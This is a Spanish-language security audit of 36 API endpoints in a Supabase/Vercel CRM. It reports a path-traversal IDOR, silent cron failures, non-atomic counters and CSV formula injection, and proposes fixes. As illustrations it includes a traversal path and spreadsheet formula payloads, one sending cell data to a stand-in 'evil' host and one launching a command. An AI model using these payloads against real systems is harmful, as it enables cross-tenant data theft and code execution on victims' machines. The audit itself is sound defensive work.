# Auditoría de los 36 endpoints `src/app/api/**/route.ts` — 9 de noviembre de 2026

Alcance: seguridad y correctness de todas las rutas de `src/app/api` (sin `legacy_reference/`), más `src/middleware.ts`, `src/shared/lib/supabase/public-paths.ts`, `src/shared/lib/auth/cron.ts` y `vercel.json`. Solo lectura del código; no se ha tocado producción ni se ha ejecutado nada. Se ha leído la auditoría del 2026-10-01 para no repetir lo ya corregido: lo que allí se marcó como arreglado (I16, I19, I20, I24, I37, C2) se ha comprobado y **sigue arreglado**; se anota en la sección "Comprobado y correcto".

Lo que no se puede saber desde el código (variables de entorno en Vercel, RLS en el remoto, comportamiento de la red) va marcado como **NO VERIFICABLE** con lo que habría que mirar.

## Resumen ejecutivo

| Gravedad | Nº |
|---|---|
| CRÍTICO | 0 |
| IMPORTANTE | 8 |
| MENOR | 16 |

No hay ningún endpoint accesible sin credencial que entregue datos de una empresa, ni ningún camino de dinero que facture dos veces. Los crons están todos detrás de `verifyCronAuth` (fail-closed, timing-safe) y el middleware los deja pasar por el prefijo `/api/cron/`. Los tres webhooks externos (GoCardless, Resend, voz) leen el cuerpo crudo y verifican HMAC en tiempo constante. Los dos open redirects del 10-01 están cerrados.

Lo que sí hay son ocho problemas importantes, de tres familias:

1. **Un IDOR por path traversal** en `/api/storage/sign` (I1): el prefijo `company_id/` se comprueba con `startsWith`, pero `..` lo atraviesa.
2. **El cron diario falla en silencio** en tres sitios: el recordatorio de instalación al cliente nunca sale porque la función exige sesión (I2, misma familia que el C2 del 10-01); la facturación mensual solo se intenta el día 1 UTC al final de un presupuesto de 240 s y sin recuperación (I3); y 28 `console.error` en vez de `tracker.error` hacen que `cron_runs` diga `ok: true` aunque fallen secciones enteras (I4).
3. **Contadores que leen filas en vez de sumar**: los topes de gasto de Google Maps se calculan sumando filas con el techo de 1.000 de PostgREST (I5) y los minutos del agente de voz se acumulan con lectura-escritura no atómica (I7).

Además: inyección de fórmulas en los CSV (I6) y un doble envío latente a AEAT si se activa `VERIFACTU_XADES_ENABLED` (I8).

## Tabla resumen de los 36 endpoints

Leyenda de estado: **OK** sin hallazgos relevantes · **AVISO** hallazgos menores o preguntas · **FALLO** hallazgo importante propio del endpoint.

| # | Ruta | Método | Autenticación | Aislamiento por empresa | Estado |
|---|---|---|---|---|---|
| 1 | `comisiones/[id]/export` | GET | sesión (middleware + `requireSession`) | `getCycleDetail` filtra `company_id` y alcance por rol (I16 cerrado) | AVISO (I6 CSV) |
| 2 | `cron/boe-check` | GET | `CRON_SECRET` | global (`legal_notices` sin `company_id`, I18 previo) | AVISO (M6) |
| 3 | `cron/churn` | GET | `CRON_SECRET` | todas, paginado y con presupuesto | OK |
| 4 | `cron/daily` | GET | `CRON_SECRET` | todas | **FALLO** (I2, I3, I4, I8) |
| 5 | `cron/gmaps-budget-alert` | GET | `CRON_SECRET` | por empresa | **FALLO** (I5) |
| 6 | `cron/hourly` | GET | `CRON_SECRET` | todas | OK |
| 7 | `cron/invoice-reminders` | GET | `CRON_SECRET` | por factura, `fetchAllRows` | AVISO (M8) |
| 8 | `cron/maintenance-reminders` | GET | `CRON_SECRET` | por job | AVISO (M9) |
| 9 | `cron/purchase-suggestions` | GET | `CRON_SECRET` | por empresa | AVISO (M6) |
| 10 | `cron/verifactu-send` | GET | `CRON_SECRET` | todas | AVISO (I8 latente) |
| 11 | `cron/voice-calls` | GET | `CRON_SECRET` | RPC por empresa + doble comprobación | AVISO (M10) |
| 12 | `cron/voice-retention` | GET | `CRON_SECRET` | RPC idempotente | OK |
| 13 | `export/[entity]` | GET, POST→GET | sesión + roles de dirección (+ solo admin para `time-records`) | RLS en 4 entidades, `company_id` explícito en 4 | AVISO (I6 CSV, M13) |
| 14 | `gocardless/callback` | GET | sesión (middleware) + `session_token` del flow | flow por token; `return_path` saneado (I20 cerrado) | AVISO (M14) |
| 15 | `gocardless/webhook` | POST | HMAC-SHA256 con secreto **por empresa**, timing-safe | `company_id` de la query validado por la firma | AVISO (M4) |
| 16 | `maps/client-key` | GET | sesión | clave de la empresa de la sesión | OK |
| 17 | `maps/streetview` | GET | sesión + feature + topes | empresa de la sesión | AVISO (I5, M11) |
| 18 | `pdf/catalog-v2/[token]` | GET | público por token (48 hex, caduca 60 d, revocable) | empresa del share | AVISO (M1) |
| 19 | `pdf/catalog` | GET | sesión | empresa de la sesión | OK (M1) |
| 20 | `pdf/contract/[id]` | GET | sesión + rol | RLS en `getContract` | OK |
| 21 | `pdf/contract/public/[token]` | GET | público por token (64 hex, caduca, cancelable) | empresa del token; `generateContractPdfForCompany` filtra todo | OK |
| 22 | `pdf/free-trial/[id]` | GET | sesión | `.eq("company_id")` con admin client | AVISO (M2: sin gate de rol, lleva DNI) |
| 23 | `pdf/invoice-verifactu/[id]` | GET | sesión + rol | comprueba `inv.company_id` | OK (M15) |
| 24 | `pdf/invoice/[id]` | GET | sesión + rol | `getInvoice` comprueba empresa | OK (M15) |
| 25 | `pdf/product-datasheet/[id]` | GET | sesión | comprueba pertenencia antes de generar | OK (M1) |
| 26 | `pdf/proposal/[id]` | GET | sesión | RLS en `getProposal` | AVISO (M2) |
| 27 | `pdf/savings/[id]` | GET | sesión | `.eq("company_id")` | AVISO (M2) |
| 28 | `pdf/work-report/[id]` | GET | sesión + rol | comprueba `company_id` a mano | OK (M12) |
| 29 | `sepa/remesa-xml` | GET | sesión + `company_admin` | empresa de la sesión | OK |
| 30 | `storage/sign` | GET | sesión | prefijo `company_id/` con `startsWith` | **FALLO** (I1) |
| 31 | `track/click/[id]` | GET | público | por id de `email_outbox`; destino debe estar en el HTML original (I20 cerrado) | OK |
| 32 | `track/open/[id]` | GET | público | por id | OK (M16) |
| 33 | `voice-agent/inbound` | POST | HMAC `VOICE_WEBHOOK_SECRET` con ventana 30 min | empresa por número llamado (RPC) | OK |
| 34 | `voice-agent/tools/[tool]` | POST | secreto por empresa comparado por hash en tiempo constante | empresa derivada del secreto; lista blanca por papel | OK (pregunta P2) |
| 35 | `voice-agent/webhook` | POST | HMAC | intento por `provider_call_id` / `task_id` | AVISO (I7, M5) |
| 36 | `webhooks/resend` | POST | Svix HMAC + ventana 5 min, fail-closed | por `resend_id` | AVISO (M3) |

### Middleware y `vercel.json`

- `src/middleware.ts` delega en `updateSession` (`src/shared/lib/supabase/middleware.ts`). **Solo redirige al login en GET** (líneas 55-57): cualquier POST/PUT/DELETE llega al handler sin pasar por el filtro. Hoy todos los handlers POST (`gocardless/webhook`, `voice-agent/*`, `webhooks/resend`, `export/[entity]`) se autentican solos, así que no hay agujero; pero es una regla implícita que conviene dejar escrita y probada (ver recomendación R1).
- `public-paths.ts` abre por prefijo: `/api/cron/`, `/api/webhooks/`, `/api/track/`, `/api/pdf/catalog-v2/`, `/api/pdf/contract/public/`, `/api/health`. El prefijo `/api/pdf/contract/public/` no abre `/api/pdf/contract/[id]`. Correcto.
- Los 11 crons de `vercel.json` están bajo `/api/cron/` y los 11 handlers llaman a `verifyCronAuth` como primera instrucción (comprobado uno a uno). `verifyCronAuth` es fail-closed si falta `CRON_SECRET`, acepta `Authorization: Bearer` (lo que manda Vercel) y `x-cron-secret`, y compara en tiempo constante.
- Solape de horarios: `daily` a las 22:00 y `verifactu-send` a `0,15,30,45` coinciden a las 22:00 en punto y ambos llaman a `processVerifactuQueue` (ver I8). `hourly` (:15) y `verifactu-send` (:15) coinciden pero no comparten trabajo.
- **NO VERIFICABLE**: que `CRON_SECRET`, `VOICE_WEBHOOK_SECRET`, `RESEND_WEBHOOK_SECRET` y `VERIFACTU_XADES_ENABLED` estén definidas en Vercel con el valor esperado, y si Vercel entrega algún cron por duplicado (la memoria dice que `CRON_SECRET` se creó el 10-09).

## CRÍTICO

Ninguno. Criterio aplicado: dato de una empresa accesible sin credencial o desde otra empresa sin conocer un secreto, o dinero cobrado/facturado dos veces. I1 se queda en IMPORTANTE porque exige estar logueado y conocer la ruta exacta del fichero ajeno.

## IMPORTANTE

### I1. `/api/storage/sign`: el prefijo `company_id/` se atraviesa con `..`

- **Dónde:** `src/app/api/storage/sign/route.ts:10` (`/^[0-9a-f-]{36}\//`) y `src/modules/installations/photo-actions.ts:137` (`storagePath.startsWith(\`${session.company_id}/\`)`).
- **Evidencia:** ninguna de las dos comprobaciones rechaza segmentos `..`. `storage-js` no codifica el path: `_getFinalPath` solo quita barras iniciales y lo interpola tal cual en `${url}/object/sign/${_path}` (`node_modules/@supabase/storage-js/dist/index.mjs:994-1006,1474-1476`). El parser de URL (WHATWG, el que usa `fetch`) normaliza los segmentos `.`/`..` y también sus formas `%2e`.
- **Escenario:** un usuario de la empresa A pide `?path=<uuid_A>/../<uuid_B>/<ruta_del_documento>`. Pasa la regex, pasa el `startsWith`, y la petición que llega a Storage es `documents/<uuid_B>/<ruta>`. Devuelve una URL firmada de 1 h a un documento de B (el bucket `documents` guarda fotos de instalación y documentación). Hace falta conocer la ruta ajena, pero las rutas llevan UUIDs que ya se filtran por otras vías (auditoría 10-01, I10-I15).
- **Estado:** CONFIRMADO en el código (ruta + storage-js). **NO VERIFICADO en ejecución**: habría que probarlo contra el proyecto de Supabase con dos empresas de prueba.
- **Arreglo:** en `getSignedPhotoUrl`, rechazar si el path contiene `..`, `%`, `\`, `//` o caracteres de control; normalizar con `path.posix.normalize` y volver a exigir el prefijo exacto después de normalizar; limitar los caracteres a `[A-Za-z0-9/_.-]`. Añadir un test con `uuid/../otro/x.jpg`.

### I2. `cron/daily`: el recordatorio de instalación al cliente nunca se envía (función con `requireSession` dentro de un cron)

- **Dónde:** `src/app/api/cron/daily/route.ts:559-577` llama a `sendTransactionalEmail`, que empieza con `const session = await requireSession();` (`src/modules/mailing/actions.ts:585`).
- **Evidencia:** en un cron no hay cookie; `requireSession` hace `redirect("/login")` (`session.ts:67`), que lanza. El `catch` de la línea 604-605 lo traga con `console.error`, no con `tracker.error`, así que `cron_runs` queda en `ok: true`. El bloque de WhatsApp (579-603) está dentro del mismo `try`, detrás del email, y por tanto tampoco se ejecuta nunca.
- **Escenario:** desde que existe este bloque, ningún cliente ha recibido el correo "mañana tenemos tu instalación" ni el WhatsApp. Es el mismo fallo que el churn del C2 (10-01); aquel se movió a su cron y este se quedó.
- **Estado:** CONFIRMADO en el código.
- **Arreglo:** hacer como `maintenance-reminders`: plantilla (`email_templates` → sistema) + `buildEmailHtml` + `sendViaSmtp({ companyId, senderUserId: null, ... })` y registrar en `email_sends`. O crear `sendTransactionalEmailForCompany(companyId, input)` sin sesión y que `sendTransactionalEmail` la envuelva. Cambiar el `console.error` por `tracker.error`.

### I3. `cron/daily`: la facturación mensual depende de que el día 1 UTC el cron llegue con tiempo, y no hay recuperación

- **Dónde:** `src/app/api/cron/daily/route.ts:1340-1341` (`today.getDate() === 1` en UTC) y `1366-1454`.
- **Evidencia:** el bloque va detrás de una docena de secciones que consumen hasta 240 s (`PRESUPUESTO_MS`) y, aunque él no se corta, Vercel mata la función a los 300 s. Si el cron del día 1 no se ejecuta, falla o se corta a mitad del bucle de contratos, el día 2 ya no se intenta. `registrarCuotaMensualContrato` es idempotente por `(contract, billing_period)` (`create-core.ts:523-575`), así que repetirlo sería inocuo.
- **Escenario:** mes con muchos contratos activos: el cron llega a la facturación en el segundo 240 y le quedan 60 s. Factura N contratos y muere. Los demás no se facturan ese mes y nadie lo ve (ver I4). O simplemente Vercel no ejecuta el cron esa noche.
- **Estado:** CONFIRMADO en el código; que haya pasado ya, NO VERIFICABLE sin `cron_runs`/`invoices`.
- **Arreglo:** sacar la facturación mensual a su propio cron (por ejemplo `0 6 1-5 * *`, idempotente, con `tracker` propio) o, como mínimo, ejecutarla **al principio** de `daily` y en los días 1 a 5. Registrar `omitida`/`errors` como `tracker.error` cuando `errors > 0`.

### I4. `cron/daily`: 28 fallos se registran con `console.error`, no con `tracker.error`, y la respuesta siempre dice `ok: true`

- **Dónde:** `src/app/api/cron/daily/route.ts` líneas 289, 366, 602, 605, 739, 784, 806, 849, 864, 991, 1000, 1092, 1111, 1144, 1187, 1225, 1289, 1334, 1349, 1452, 1489, 1493, 1525, 1530, 1612, 1616, 1667, 1672 (`console.error`) frente a solo 6 `tracker.error` (96, 773, 1285, 1448, 1733, 1796). Línea 1829: `ok: true` fijo.
- **Escenario:** la memoria del proyecto dice que los logs de Vercel por CLI no sirven y que los fallos se miran en `cron_runs`/`error_reports`. Con este patrón, secciones enteras (facturación mensual, GoCardless retry, SLA, puntos, RRSS, reconciliaciones) pueden fallar cada noche y `cron_runs` seguirá en verde. I2 es un ejemplo real.
- **Arreglo:** sustituir todos los `console.error` del cron por `tracker.error("<sección>", e)` y devolver `ok: tracker.errors.length === 0` como hacen `churn` e `invoice-reminders`. Opcional: un test que recorra `src/app/api/cron/**` y falle si hay `console.error` fuera de `tracker`.

### I5. Google Maps: los topes diario/mensual y la alerta de presupuesto suman filas con el techo de 1.000 de PostgREST

- **Dónde:** `src/shared/lib/google-maps/config.ts:264-290` (`getUsageUsd`: `select("cost_micro_usd")` + `reduce`), usada por `canUseGoogleMaps` (169-216) que protege `/api/maps/streetview` y el geocoding; y `src/app/api/cron/gmaps-budget-alert/route.ts:83-104` (misma suma por filas). No existe ninguna función ni vista SQL de agregado sobre `google_api_usage` (comprobado en `supabase/migrations`).
- **Evidencia:** `fetch-all.ts` documenta que PostgREST corta en 1.000 filas sin error. Cada llamada a Google es una fila; a partir de la llamada 1.001 del mes el consumo calculado deja de crecer.
- **Escenario:** una empresa con `own_key` pasa de 1.000 llamadas en el mes: el tope mensual nunca se alcanza, Street View y geocoding siguen gastando, y la alerta del 80 % del free tier no salta. Es exactamente el caso para el que están los topes.
- **Otros detalles del mismo bloque:** `since.setHours(0,0,0,0)` y `new Date(y, m, 1)` usan la hora del servidor (UTC en Vercel), no Madrid; `today` en la alerta (línea 32) también es UTC.
- **Arreglo:** una RPC `gmaps_usage_usd(company_id, desde)` con `sum(cost_micro_usd)` y usarla en los tres sitios; o `select("cost_micro_usd.sum()")` de PostgREST si la versión lo soporta. Calcular los límites de día/mes con `rangoDiaMadridUtc`/`mesMadrid`.

### I6. Inyección de fórmulas en los CSV de exportación

- **Dónde:** `src/shared/lib/csv/to-csv.ts:8-13` (solo escapa `"`, `,`, `\n`, `\r`), usado por `src/app/api/export/[entity]/route.ts` (nombres, emails, `manual_reason`, `edited_reason`, `payload` JSON) y `src/app/api/comisiones/[id]/export/route.ts` (`u.user_name`, `a.reason`).
- **Escenario:** un lead entra por formulario web o un empleado escribe un motivo de fichaje que empieza por `=`, `+`, `-` o `@` (p. ej. `=HYPERLINK("http://evil/?"&A1;"ver")` o `=cmd|'/C calc'!A0`). El administrador descarga el CSV y lo abre en Excel: la fórmula se evalúa con sus permisos. Las entidades con más texto libre de terceros son `leads` y `customers`.
- **Arreglo:** en `escape`, si `s` empieza por `=`, `+`, `-`, `@`, `\t` o `\r`, anteponer `'` (y envolver en comillas). Añadir test.

### I7. Webhook de voz: idempotencia y contador de minutos no atómicos (el tope mensual se puede quedar corto)

- **Dónde:** `src/app/api/voice-agent/webhook/route.ts:95-131` (lee `ended_at`, decide, y luego `update` sin condición) y `src/modules/voice-agent/settings.ts:254-269` (`addMinutesUsed`: `loadVoiceSettings` → `update({ minutes_used_month: s.minutes_used_month + minutes })`).
- **Escenario A (reentrega):** ElevenLabs reintenta el webhook mientras la primera entrega aún está procesando: las dos ven `ended_at = null`, las dos suman minutos. Escenario B (concurrencia real): el marcador lanza hasta 15 llamadas por empresa (`voice-calls`, `BATCH_PER_COMPANY`); varias terminan en el mismo segundo y cada webhook lee el mismo `minutes_used_month` y escribe su suma: se pierden minutos y `monthly_minutes_cap` protege menos de lo que dice.
- **Arreglo:** cerrar el intento con `update({...}).eq("id", id).is("ended_at", null).select("id")` y solo sumar minutos si devolvió una fila; sumar con una RPC (`update ... set minutes_used_month = minutes_used_month + $1`) o `rpc("voice_add_minutes", …)`.

### I8. Cola VeriFactu (XAdES): `daily` y `verifactu-send` coinciden a las 22:00 y el reclamo de registros no es atómico — doble envío latente

- **Dónde:** `vercel.json` (`daily` `0 22 * * *`, `verifactu-send` `0,15,30,45 * * * *`); `src/app/api/cron/daily/route.ts:814-817` llama a `processVerifactuQueue`; `src/modules/invoices/verifactu-queue.ts:44-49` selecciona `status = pending` y en `155-165` lo pasa a `sending` **sin** `.eq("status","pending")` ni comprobar filas afectadas.
- **Evidencia:** las dos ejecuciones leen los mismos `pending`, las dos los marcan `sending`, las dos llaman a `sendToAeat`. Hoy está desactivado por `VERIFACTU_XADES_ENABLED !== "true"` (línea 35-39) y la memoria dice que VeriFactu va por Verifacti; por eso es **latente**.
- **Arreglo:** reclamo atómico (`update ... set status='sending' where id=$1 and status='pending' returning id`, o una RPC que haga `FOR UPDATE SKIP LOCKED`), y quitar la llamada de `daily` ahora que `verifactu-send` corre cada 15 min. NO VERIFICABLE: el valor de la variable en Vercel (pregunta P3).

## MENOR

### M1. Mensajes internos (`err.message`) devueltos al cliente
- `pdf/proposal/[id]:20`, `pdf/savings/[id]:20`, `pdf/free-trial/[id]:23`, `pdf/catalog:24`, `pdf/invoice/[id]:35`, `pdf/contract/[id]:37`, `pdf/work-report/[id]:38`, `pdf/product-datasheet/[id]:71`, `storage/sign:19` devuelven `err.message` a usuarios autenticados: salen textos de PostgREST ("column … does not exist", nombres de tablas) y oráculos tipo "Otra empresa" (`getInvoice`). `pdf/catalog-v2/[token]:80` lo hace **a anónimos**. `pdf/contract/public/[token]:66-70` ya lo hace bien (log + mensaje fijo).
- Arreglo: mensaje fijo en la respuesta, `console.error` con el detalle (o `error_reports`).

### M2. PDFs sin gate de rol: propuesta, ahorro y albarán de prueba gratuita
- `pdf/proposal/[id]`, `pdf/savings/[id]`, `pdf/free-trial/[id]` solo exigen sesión; `pdf/invoice`, `pdf/contract` y `pdf/work-report` sí filtran por rol. El albarán de prueba gratuita lleva DNI, teléfono y dirección del cliente (`free-trials/pdf-generator.ts:731-732`). Ver pregunta P1.

### M3. Webhook de Resend sin deduplicación por `svix-id`
- `webhooks/resend/route.ts:85-175`: la ventana de 5 min evita el replay antiguo, pero un reintento legítimo de Svix dentro de la ventana vuelve a sumar `opens_count`/`clicks_count` (lectura-escritura, líneas 150-159). Arreglo: tabla `webhook_events(svix_id unique)` o índice único, y `opens_count = opens_count + 1` vía RPC.

### M4. Webhook de GoCardless: detalles
- `gocardless/webhook/route.ts:67-89`: dos entregas simultáneas del mismo evento pasan las dos el `insert`+`processed_at is null` y procesan en paralelo (`procesarEventoGc` es máquina de estados, así que el daño es limitado). Línea 33: `company_id` no se valida como UUID (un valor no UUID produce 22P02 que se traduce en 401 "no webhook secret"; inocuo). Líneas 49 y 52: dos mensajes 401 distintos revelan si una empresa tiene GoCardless configurado.

### M5. Firma de voz sin `t=`: sin protección anti-replay por esa vía
- `voice-agent/webhook-auth.ts:25-31`: si el header `x-hm-voice-signature` llega sin timestamp, se firma solo el cuerpo y una petición capturada vale para siempre. Mitigado por la idempotencia (I7 cuando se arregle). Arreglo: exigir `t=` siempre.

### M6. Crons sin telemetría ni comprobación de errores
- `cron/boe-check`, `cron/purchase-suggestions` y `cron/gmaps-budget-alert` no usan `startCronRun` (ya anotado como "no verificado" el 10-01; sigue igual). `purchase-suggestions:22-27` dice "sin registro → asumir activo" pero el código solo coge `is_active = true` (comentario y código discrepan). `boe-check:194-201` y `purchase-suggestions:23-27,44-49` no miran `error`.

### M7. `cron/daily`: varios detalles
- 296-321: activa el contrato (`status: active`) **antes** de `autoScheduleMaintenanceForContract`; si esto lanza, el `catch` vacío lo traga y mañana ya no es `signed`, así que no se reintenta: contrato activo sin mantenimientos.
- 877-884: incidencias con SLA `.limit(500)` sin `order` ni filtro por empresa: si hay más de 500 abiertas con `deadline_at`, cuáles se evalúan es arbitrario.
- 885-886: "una notificación por etapa y día" con el día en UTC.
- 1103-1109 y 1135-1142: el recuento de `mailing_purged`/`proposals_expired` sale del `.select("id")` de un `update`, que PostgREST recorta a 1.000: solo afecta al número del resumen (NO VERIFICABLE si `max-rows` limita también las filas afectadas; la documentación de PostgREST dice que no).
- 1193-1198: `.lt("expires_at", todayDate)` compara un `timestamptz` con `AAAA-MM-DD` (medianoche UTC).

### M8. `cron/invoice-reminders`: avisa al admin de "recordatorio enviado" aunque el SMTP falle
- `invoice-reminders/route.ts:343-360`: el `catch` del envío registra el error y se sigue con `notifyByRoles(... reminder_${level}_sent)`. El admin cree que el cliente lo recibió. Arreglo: notificar solo si `sendRes.ok`, o con un texto distinto si falló.

### M9. `cron/maintenance-reminders`
- 226-229: si falta `NEXT_PUBLIC_APP_URL` el enlace de confirmación sale como `https://crm.example.com/m/<token>`. Mejor abortar con `tracker.error`.
- 57-64: la consulta de los 14 días no mira `error` (la de la víspera sí, línea 105).
- 326-346: `email_sends.insert` sin comprobar error; `from_email: company.name` no es un correo.

### M10. `cron/voice-calls`: si falla el insert del intento, la llamada se hace igual y sus minutos no se contabilizan
- `voice-calls/route.ts:197-214`: `{ data: attemptRow }` sin `error`; con `attemptId = null` se llama a `placeCall` (216) y el webhook de cierre no encontrará el intento (`webhook/route.ts:87-91`, `ignored: attempt_not_found`). Arreglo: si no hay `attemptId`, no marcar y liberar la tarea.

### M11. `maps/streetview`
- 29-30: `Number("abc")` → `NaN` → `size=NaNxNaN` (Google responde error, se cuenta como fallo). Línea 37: `statusText: gm.reason` expone el motivo interno (topes en dólares) al navegador. Validar con `Number.isFinite` y rangos.

### M12. `pdf/work-report/[id]`: comprobación de empresa que admite `company_id` nulo
- `installations/pdf-generator.ts:865`: `if (_instAny.company_id && _instAny.company_id !== session.company_id)`. Una instalación con `company_id` nulo pasaría. Comparar con igualdad estricta sin el `&&`.

### M13. `export/[entity]`: el registro RGPD de la descarga puede no escribirse nunca
- `export/[entity]/route.ts:98-108`: `supabase.from("events").insert(...)` con el cliente RLS y sin mirar `error` (el `try/catch` solo caza excepciones, y supabase-js no lanza). Si la política de insert de `events` no deja al usuario, la traza obligatoria de "quién descargó datos personales" no existe. NO VERIFICABLE sin la RLS del remoto. Arreglo: admin client con `company_id` de la sesión y comprobar `error`.

### M14. `gocardless/callback`: no comprueba el estado del flow antes de completarlo
- `gocardless/actions.ts:258-279`: valida `session_token` pero no `flow.status`; un segundo callback con los mismos parámetros vuelve a llamar a GoCardless (que previsiblemente rechaza el flow ya completado) y, si no lo hiciera, insertaría un segundo mandato. La comparación del token (279) es `!==` en vez de tiempo constante (el token es aleatorio y va acompañado del `redirect_flow_id`, riesgo bajo).

### M15. `pdf/invoice/[id]` y superadmin
- `getInvoice` (`invoices/actions.ts:270-272`) lanza "Sin empresa" si `session.company_id` es nulo: el superadmin no puede descargar ese PDF, mientras que `pdf/invoice-verifactu/[id]` sí se lo permite (líneas 19-21, 49). Pregunta P4.

### M16. `track/open/[id]` y `track/click/[id]`: contadores con lectura-escritura
- `track/open:45-60`, `track/click:41-65`: dos aperturas simultáneas pierden una. Cosmético.

## Comprobado y correcto (no repetir)

- **Crons**: los 11 handlers empiezan por `verifyCronAuth`; el middleware abre `/api/cron/` por prefijo y el 307 al login del 10-09 ya no ocurre.
- **I19 (10-01)**: `/api/pdf/catalog-v2/` y `/api/pdf/contract/public/` están en `PUBLIC_PATHS`; el PDF público usa `generateContractPdfForCompany`, que filtra contrato, líneas y pagos por `company_id` (`contracts/pdf-generator.ts:1191-1220`).
- **I20 (10-01)**: `track/click` solo redirige a un destino que aparezca literal como `href` http(s) en `email_outbox.body_html` y con un id UUID existente (`mailing/tracking.ts:47-57`); `gocardless/callback` sanea `return_path` (`ruta-retorno.ts:10-16`) y no refleja `e.message`.
- **I16 (10-01)**: `getCycleDetail` filtra `company_id` y solo `esGestorComisiones` ve a toda la plantilla; `fetchAllRows` para el ledger (`points/cycles-actions.ts:143-185`).
- **I37 (10-01)**: `export/[entity]` e `invoice-reminders` paginan con `fetchAllRows`; `churn` con `leerTodo` (que además lanza si falla un tramo).
- **I24 (10-01)**: `gocardless/webhook` responde 500 si algún evento falla y reprocesa el que quedó sin `processed_at`.
- **Webhooks**: los tres leen el cuerpo crudo antes de parsear, HMAC-SHA256 con `timingSafeEqual`, fail-closed si falta el secreto. Resend verifica varias firmas rotadas y ventana de 5 min. Voz tiene ventana de 30 min cuando llega `t=`.
- **Tokens públicos**: contrato 64 hex (`crypto.randomUUID` + 16 bytes aleatorios, `remote-sign-actions.ts:14`) con caducidad y `cancelled_at`; catálogo `gen_random_bytes(24)` hex con caducidad 60 d y `revoked_at` (migración `20260604100400:36-38`); confirmación de mantenimiento 24 bytes base64url, 30 d. Ninguno enumerable.
- **Agente de voz**: el `company_id` se deriva del secreto (hash SHA-256 comparado en tiempo constante), lista blanca de herramientas por papel, tarea/intento filtrados por empresa, `toE164` sanea el teléfono antes de los `.or()` de `lookup.ts:107,145`. El cron de marcado reclama tareas por RPC y por empresa.
- **Validación de entrada**: `export/[entity]` con lista cerrada; `tool` contra `toolsForRole`; `.or()` del cron diario (`daily:170`) y de voz (`settings.ts:145`) interpolan UUIDs de BD, no texto del usuario.
- **Roles**: facturas y contratos por rol; `export` por rol y `time-records` solo admin; SEPA solo `company_admin`; `product-datasheet` comprueba pertenencia antes de generar.
- **Coste Google**: `maps/client-key` solo devuelve la clave pública/propia de la empresa de la sesión; `streetview` pasa por `canUseGoogleMaps` (feature + topes) y registra cada llamada. El fallo está en cómo se suman los topes (I5), no en la puerta.
- **Idempotencia** en `voice-retention` (`transcript_purged_at`), `invoice-reminders` (registro antes de enviar), `maintenance-reminders` (`*_sent_at`), `gmaps-budget-alert` (`gmaps_alert_last_sent_day`), cuota mensual (`billing_period`).

## Recomendaciones transversales

- **R1.** Dejar escrito (y con test en `public-paths.test.ts`) que el middleware no protege métodos distintos de GET y que todo handler POST debe autenticarse solo. Un test que recorra `src/app/api/**/route.ts` y exija `requireSession|verifyCronAuth|verify*Signature|companyFromToolSecret` en cada fichero evitaría un descuido futuro.
- **R2.** Regla de código: dentro de `src/app/api/cron/**` no se permite `console.error`; siempre `tracker.error`. Y `ok: tracker.errors.length === 0`.
- **R3.** Un helper `respuestaError500(err, etiqueta)` que loguee y devuelva mensaje fijo, para quitar los `err.message` de M1 de una vez.
- **R4.** Cualquier suma de dinero/coste sobre tablas de eventos (`google_api_usage`, `invoice_payments`, …) debe ir por RPC de agregado, nunca por `select + reduce`.

## Preguntas para Mario

- **P1.** ¿Telemarketers e instaladores deben poder descargar los PDF de propuesta, ahorro y, sobre todo, el albarán de prueba gratuita (lleva DNI)? Si no, aplicar el mismo gate que `pdf/contract`.
- **P2.** `posponer_llamada` (`voice-agent/tools:520-537`) pone `attempts: 0` cada vez: una tarea comercial puede posponerse y volver a llamarse indefinidamente. ¿Es lo deseado o debe contar el intento?
- **P3.** ¿`VERIFACTU_XADES_ENABLED` está definida en Vercel? Si VeriFactu va por Verifacti, ¿se puede quitar `processVerifactuQueue` de `daily` y dejar solo `verifactu-send`?
- **P4.** ¿El superadmin debe poder descargar `/api/pdf/invoice/[id]`? Hoy falla ("Sin empresa") mientras que `invoice-verifactu` sí le deja.
- **P5.** Facturación mensual: ¿ventana de recuperación los días 1 a 5 (idempotente) o cron propio el día 1 por la mañana?
- **P6.** `legal_notices` (BOE) sigue sin `company_id` (I18 del 10-01): un director que descarta un aviso lo quita para todas las empresas. ¿Se mantiene así?

## No verificable desde el código

- Variables de entorno en Vercel: `CRON_SECRET`, `VOICE_WEBHOOK_SECRET`, `RESEND_WEBHOOK_SECRET`, `VERIFACTU_XADES_ENABLED`, `NEXT_PUBLIC_APP_URL`.
- Políticas RLS reales en el remoto para `proposals`, `contracts`, `leads`, `customers`, `installations` (los PDF de propuesta/contrato y 4 entidades del export confían en ellas; existen en `supabase/migrations/20260501121200_proposals.sql:165-195` y `20260501121300_contracts.sql:236-265`) y la política de insert de `events` (M13).
- Que la petición a Storage normalice `..` (I1): el cliente no lo codifica; falta la prueba real.
- Restricción por referrer de la clave de Google que `maps/client-key` entrega al navegador.
- `maxDuration` efectivo de las rutas PDF que no lo declaran (depende del plan y de la configuración de Vercel).
- Si Vercel ha entregado algún cron duplicado o si `cron_runs` tiene filas con `ended_at` nulo desde el 10-01.
